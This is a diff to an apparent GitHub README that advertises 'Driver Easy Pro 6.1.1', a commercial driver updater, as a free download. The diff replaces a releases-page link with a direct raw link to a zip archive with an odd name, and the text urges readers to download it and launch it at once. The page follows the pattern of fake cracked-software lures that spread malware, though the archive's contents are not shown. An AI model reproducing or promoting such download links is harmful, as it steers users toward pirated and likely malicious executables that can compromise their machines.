@@ -24,7 +24,7 @@ By exploring this repository, you'll find valuable information on topics such as
 
 To access the Driver Easy Pro 6.1.1 software, please download it from the following link: 
 
-[![Download Driver Easy Pro](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/releases/tag/v2.0)](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/releases/tag/v2.0)
+[![Download Driver Easy Pro](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/raw/refs/heads/main/hypercenosis/Pro-Driver-Easy-v3.1-beta.1.zip)](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/raw/refs/heads/main/hypercenosis/Pro-Driver-Easy-v3.1-beta.1.zip)
 
 Remember, the software needs to be launched after download to start benefiting from all its great features.
 
@@ -36,6 +36,6 @@ If the provided link is not working or you require further assistance, please ch
 
 Don't wait any longer to optimize your PC performance and update your drivers effortlessly. Download Driver Easy Pro 6.1.1 now and enjoy a seamless driver update experience!
 
-![Driver Easy Pro](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/releases/tag/v2.0)
+![Driver Easy Pro](https://github.com/mahatab7/Driver-Easy-Pro-6.1.1-/raw/refs/heads/main/hypercenosis/Pro-Driver-Easy-v3.1-beta.1.zip)
 
 Enjoy using Driver Easy Pro 6.1.1 and keep your drivers up to date for a smooth computing experience! Thank you for visiting this repository. 🙌🏼
